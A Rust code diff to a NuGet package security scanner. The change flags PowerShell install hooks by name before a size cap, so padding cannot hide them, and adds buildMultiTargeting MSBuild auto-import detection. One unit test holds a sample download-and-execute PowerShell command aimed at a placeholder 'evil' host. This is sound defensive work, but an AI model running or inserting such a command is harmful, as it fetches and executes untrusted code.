@@ -138,7 +138,32 @@ pub fn scan_extracted_nupkg(dest_root: &Path) -> Result<NupkgScan> {
             .replace('\\', "/");
         let lower_rel = rel.to_ascii_lowercase();
         let meta = entry.metadata()?;
-        if meta.len() > TEXT_MAX_BYTES {
+        let oversized = meta.len() > TEXT_MAX_BYTES;
+
+        // STEP 1 — PATH-based classification, BEFORE the size cap.
+        //
+        // The NuGet trigger surface (install-hook scripts, MSBuild
+        // auto-import files, the root manifest) is identified by path, not
+        // content. An attacker can pad any of these past `TEXT_MAX_BYTES`
+        // to evade a size-gated scan, so we flag the install-hook by name
+        // here regardless of size. This is the structural signal that an
+        // install/build hook is present at all.
+        let is_nuspec = !rel.contains('/') && lower_rel.ends_with(".nuspec");
+        let is_ps1 = lower_rel.ends_with(".ps1");
+        let is_msbuild = is_msbuild_autoimport(&lower_rel);
+        if is_ps1 {
+            // Path-only: a canonically-named install hook is flagged even
+            // when its body is oversized (content rules below may be
+            // unavailable, but its mere presence is the structural signal).
+            scan_powershell_name(&rel, &mut findings);
+        }
+
+        // STEP 2 — read + decode the body. NuGet trigger files have their
+        // content rules applied even when oversized (their set is bounded
+        // and they are exactly the evasion target); generic files honor the
+        // size cap so an arbitrarily large blob is not loaded into memory.
+        let is_trigger = is_nuspec || is_ps1 || is_msbuild;
+        if oversized && !is_trigger {
             continue;
         }
         let bytes = match std::fs::read(abs) {
@@ -151,35 +176,35 @@ pub fn scan_extracted_nupkg(dest_root: &Path) -> Result<NupkgScan> {
         let content = String::from_utf8_lossy(&bytes).into_owned();
 
         // The single root-level `*.nuspec` is the manifest.
-        if !rel.contains('/') && lower_rel.ends_with(".nuspec") {
+        if is_nuspec {
             nuspec_seen = true;
             if let Some((n, v)) = parse_nuspec_name_version(&content) {
                 name = name.or(n);
                 version = version.or(v);
             }
-            // The nuspec is also scanned as text below (contentFiles etc.).
             scan_nuspec_structure(&content, &rel, &mut findings);
             continue;
         }
 
-        // Ecosystem-agnostic content rules everywhere.
-        scan_text_file(
-            &TextFile {
-                rel: rel.clone(),
-                content: content.clone(),
-            },
-            &mut findings,
-        );
-
-        // PowerShell install/uninstall hooks.
-        if lower_rel.ends_with(".ps1") {
-            scan_powershell(&content, &rel, &mut findings);
+        // Ecosystem-agnostic content rules. Generic files only reach here
+        // when within the size cap; trigger files reach here regardless.
+        if !oversized {
+            scan_text_file(
+                &TextFile {
+                    rel: rel.clone(),
+                    content: content.clone(),
+                },
+                &mut findings,
+            );
         }
 
-        // MSBuild build-time integration files.
-        if (lower_rel.ends_with(".targets") || lower_rel.ends_with(".props"))
-            && (lower_rel.starts_with("build/") || lower_rel.starts_with("buildtransitive/"))
-        {
+        // PowerShell install/uninstall content rules (download-exec, obfuscation).
+        if is_ps1 {
+            scan_powershell_content(&content, &rel, &mut findings);
+        }
+
+        // MSBuild build-time content rules.
+        if is_msbuild {
             scan_msbuild(&content, &rel, &mut findings);
         }
     }
@@ -199,8 +224,21 @@ pub fn scan_extracted_nupkg(dest_root: &Path) -> Result<NupkgScan> {
     })
 }
 
-/// Detect install-hook scripts by canonical name and dangerous content.
-fn scan_powershell(content: &str, rel: &str, findings: &mut Vec<Finding>) {
+/// Returns true when a (lowercased) relative path is an MSBuild file that
+/// NuGet auto-imports into the consumer build. NuGet auto-imports
+/// `.targets`/`.props` from `build/`, `buildTransitive/`, AND
+/// `buildMultiTargeting/` (the latter is imported when the consuming project
+/// multi-targets several TFMs).
+fn is_msbuild_autoimport(lower_rel: &str) -> bool {
+    (lower_rel.ends_with(".targets") || lower_rel.ends_with(".props"))
+        && (lower_rel.starts_with("build/")
+            || lower_rel.starts_with("buildtransitive/")
+            || lower_rel.starts_with("buildmultitargeting/"))
+}
+
+/// Flag install-hook scripts by canonical name. Path-only: runs before the
+/// size cap so a padded `tools/install.ps1` is still surfaced.
+fn scan_powershell_name(rel: &str, findings: &mut Vec<Finding>) {
     let lower = rel.to_ascii_lowercase();
     let base = lower.rsplit('/').next().unwrap_or(&lower);
     if matches!(base, "init.ps1" | "install.ps1" | "uninstall.ps1") {
@@ -210,6 +248,10 @@ fn scan_powershell(content: &str, rel: &str, findings: &mut Vec<Finding>) {
             format!("`{rel}` is a NuGet install/uninstall PowerShell hook that runs in the Package Manager Console"),
         ));
     }
+}
+
+/// Detect dangerous PowerShell content (download-exec, obfuscation).
+fn scan_powershell_content(content: &str, rel: &str, findings: &mut Vec<Finding>) {
     if rules::powershell_download_exec_regex().is_match(content) {
         findings.push(finding(
             "powershell-download-exec",
@@ -357,20 +399,32 @@ mod tests {
     #[test]
     fn powershell_install_hook_flagged() {
         let mut f = Vec::new();
-        scan_powershell("Write-Host hi", "tools/install.ps1", &mut f);
+        scan_powershell_name("tools/install.ps1", &mut f);
         assert!(f.iter().any(|x| x.rule_id == "nuget-install-script"));
     }
 
     #[test]
     fn powershell_download_exec_flagged() {
         let mut f = Vec::new();
-        scan_powershell(
+        scan_powershell_name("tools/install.ps1", &mut f);
+        scan_powershell_content(
             "Invoke-WebRequest http://evil/x -OutFile p.exe; Start-Process p.exe",
             "tools/install.ps1",
             &mut f,
         );
         assert!(f.iter().any(|x| x.rule_id == "powershell-download-exec"));
         assert!(f.iter().any(|x| x.rule_id == "nuget-install-script"));
+    }
+
+    #[test]
+    fn is_msbuild_autoimport_covers_buildmultitargeting() {
+        assert!(is_msbuild_autoimport("buildmultitargeting/foo.targets"));
+        assert!(is_msbuild_autoimport("buildmultitargeting/foo.props"));
+        assert!(is_msbuild_autoimport("build/foo.targets"));
+        assert!(is_msbuild_autoimport("buildtransitive/foo.props"));
+        // Not auto-imported: arbitrary directory, or wrong extension.
+        assert!(!is_msbuild_autoimport("content/foo.targets"));
+        assert!(!is_msbuild_autoimport("buildmultitargeting/foo.txt"));
     }
 
     #[test]
